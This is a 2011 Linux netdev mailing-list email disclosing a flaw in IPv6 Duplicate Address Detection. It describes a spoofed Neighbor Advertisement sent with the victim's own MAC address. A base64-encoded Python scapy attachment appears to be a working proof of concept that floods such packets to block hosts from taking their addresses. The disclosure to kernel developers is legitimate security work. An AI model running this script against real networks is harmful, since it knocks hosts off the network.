From: Gervais Arthur <arthur.gervais@insa-lyon.fr>
Subject: Re: Fwd: PROBLEM: IPv6 Duplicate Address Detection with non RFC-conform
 ICMPv6 packets
Date: Sat, 07 May 2011 15:05:04 +0200
Message-ID: <1a18d4d5bd1ff610cde84055a87a19e6@mail.insa-lyon.fr>
References: <4DC54157.9010306@computer.org>
Mime-Version: 1.0
Content-Type: multipart/mixed;
	boundary="=_26b93bb1c174ba83a8d9517e5104729e"
To: <netdev@vger.kernel.org>
Return-path: <netdev-owner@vger.kernel.org>
Received: from criges14.insa-lyon.fr ([134.214.76.242]:37069 "EHLO
	smtp.insa-lyon.fr" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1753119Ab1EGNVX (ORCPT
	<rfc822;netdev@vger.kernel.org>); Sat, 7 May 2011 09:21:23 -0400
Received: from localhost (localhost [127.0.0.1])
	by smtp.insa-lyon.fr (Postfix) with ESMTP id BB50AF1358
	for <netdev@vger.kernel.org>; Sat,  7 May 2011 15:05:06 +0200 (CEST)
Received: from smtp.insa-lyon.fr ([127.0.0.1])
	by localhost (criges14.insa-lyon.fr [127.0.0.1]) (amavisd-new, port 10024)
	with ESMTP id om7tAtay9UAW for <netdev@vger.kernel.org>;
	Sat,  7 May 2011 15:05:06 +0200 (CEST)
Received: from webmail3.insa-lyon.fr (webmail3.insa-lyon.fr [134.214.77.245])
	by smtp.insa-lyon.fr (Postfix) with ESMTP id 265C8F1357
	for <netdev@vger.kernel.org>; Sat,  7 May 2011 15:05:06 +0200 (CEST)
In-Reply-To: <4DC54157.9010306@computer.org>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

--=_26b93bb1c174ba83a8d9517e5104729e
Content-Transfer-Encoding: 8bit
Content-Type: text/plain; charset=UTF-8

I made a small mistake in the proof of concept code.

Please find attached the corrected version (2 lines are modified)

Best regards,

Arthur Gervais


On 05/07/2011 02:55 PM, Jan Ceuleers wrote:
> The networking folks are on netdev
>
> -------- Original Message --------
> Subject: PROBLEM: IPv6 Duplicate Address Detection with non RFC-conform
> ICMPv6 packets
> Date: Thu, 05 May 2011 11:52:05 +0200
> From: Gervais Arthur <arthur.gervais@insa-lyon.fr>
> To: <linux-kernel@vger.kernel.org>
> CC: <arthur.gervais@insa-lyon.fr>
>
> [1.] One line summary of the problem:
>
> A specially crafted Ethernet ICMPv6 packet which is not conform to the
> RFC can perform a IPv6 Duplicate Address Detection Failure.
>
> [2.] Full description of the problem/report:
>
> If a new IPv6 node joins the local area network, the new node sends an
> ICMPv6 Neighbor Solicitation packet in order to check if the
> self-generated local-link IPv6 address already occupied is.
>
> An attacker can answer to this Neighbor Solicitation packet with an
> ICMPv6 Neighbor Advertisement packet, so that the new IPv6 node is not
> able to associate the just generated IPv6 address.
> -- This problem is well known and IPv6 related.
>
> The new problem is that the attacker can modify the Ethernet Neighbor
> Advertisement packets, so that they are not RFC conform and so that it
> is even more difficult to detect the attacker.
>
> If an attacker sends the following packet, duplicate address detection
> fails on Linux:
>
> Ethernet Layer: Victim MAC --> Victim MAC
> IPv6 Layer: fe80::200:edff:feXX:XXXX --> ff02::1
> ICMPv6
> Type 136 (Neighbor Advertisement)
> Target: fe80::200:edff:feXX:XXXX
> ICMPv6 Option
> Type 2 (Target link-layer address) Victim MAC
>
> Please find attached a drawing and a proof of concept.
>
> [3.] Keywords (i.e., modules, networking, kernel):
>
> Network, IPv6, Duplicate Address Detection
>
> [4.] Kernel version (from /proc/version):
>
> Latest tested:
> Linux version 2.6.35-22-generic (buildd@rothera) (gcc version 4.4.5
> (Ubuntu/Linaro 4.4.4-14ubuntu4) ) #33-Ubuntu SMP Sun Sep 19 20:34:50 UTC
> 2010
> (and before most probably)
>
> [6.] A small shell script or example program which triggers the
> problem (if possible)
>
> Please find attached a python script demonstrating the problem.
>
> [X.] Other notes, patches, fixes, workarounds:
>
> The Linux Kernel should not accept incoming Ethernet packets originating
> from an internal Ethernet card (identified by the MAC address)
>


--=_26b93bb1c174ba83a8d9517e5104729e
Content-Transfer-Encoding: base64
Content-Type: text/x-python; charset=UTF-8;
 name=dad-dos_special.py;
Content-Disposition: attachment;
 filename=dad-dos_special.py;

IyEgL3Vzci9iaW4vZW52IHB5dGhvbgoKaW1wb3J0IHN5cwpmcm9tIG11bHRpcHJvY2Vzc2luZyBp
bXBvcnQgUHJvY2Vzcwpmcm9tIHNjYXB5LmFsbCBpbXBvcnQgKgoKZGVmIGYocGt0KToKICAgICAg
ICBzZW5kcChwa3QsIGxvb3A9MSwgaW50ZXI9MSkKCmRlZiBjYWxsYmFjayhwa3QpOgogICAgICAg
IAogICAgICAgIGlmIElQdjYgaW4gcGt0IGFuZCBJQ01QdjZORF9OUyBpbiBwa3Q6ICAKICAgICAg
ICAgICAgICAgIAoJCQlzcmNfbWFjPXBrdC5zcHJpbnRmKCIlRXRoZXIuc3JjJSIpICAgIyBTb3Vy
Y2UgQWRyZXNzZQoJCQlzcmM9cGt0LnNwcmludGYoIiVJUHY2LnNyYyUiKSAgICMgU291cmNlIEFk
cmVzc2UKCQkJZHN0PXBrdC5zcHJpbnRmKCIlSVB2Ni5kc3QlIikgICAjIERlc3RpbmF0aW9uIEFk
cmVzc2UKCQkJdGd0PXBrdC5zcHJpbnRmKCIlSUNNUHY2TkRfTlMudGd0JSIpICAgICMgVGFyZ2V0
IGFkcmVzc2UgCgoJCQlpZiBzcmM9PSI6OiIgYW5kICJmZjAyOjoxOmZmIiBpbiBkc3Q6CgoJCQkJ
ZXRoID0gRXRoZXIoc3JjPXNyY19tYWMsZHN0PXNyY19tYWMpCgkJCQlpcCA9IElQdjYoc3JjPXRn
dCxkc3Q9ImZmMDI6OjEiKQoJCQkJaWNtcCA9IElDTVB2Nk5EX05BKHRndD10Z3QpCgkJCQlpY21w
T3B0ID0gSUNNUHY2TkRPcHREc3RMTEFkZHIobGxhZGRyPXNyY19tYWMpCgoJCQkJcGFja2V0ID0g
ZXRoL2lwL2ljbXAvaWNtcE9wdAoKCQkJCXAgPSBQcm9jZXNzKHRhcmdldD1mLCBhcmdzPShwYWNr
ZXQsKSkKCQkJCXAuc3RhcnQoKQoKZGVmIG1haW4oKToKICAgICAgICBjb25mLmlmYWNlNj0iZXRo
MSIKICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzY2FweS5zZW5kcmVjdi5zbmlmZihwcm49
Y2FsbGJhY2ssc3RvcmU9MCkKICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAg
ICAgICAgICAgICBleGl0KDApCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgICAgIG1h
aW4oKQo=
--=_26b93bb1c174ba83a8d9517e5104729e--

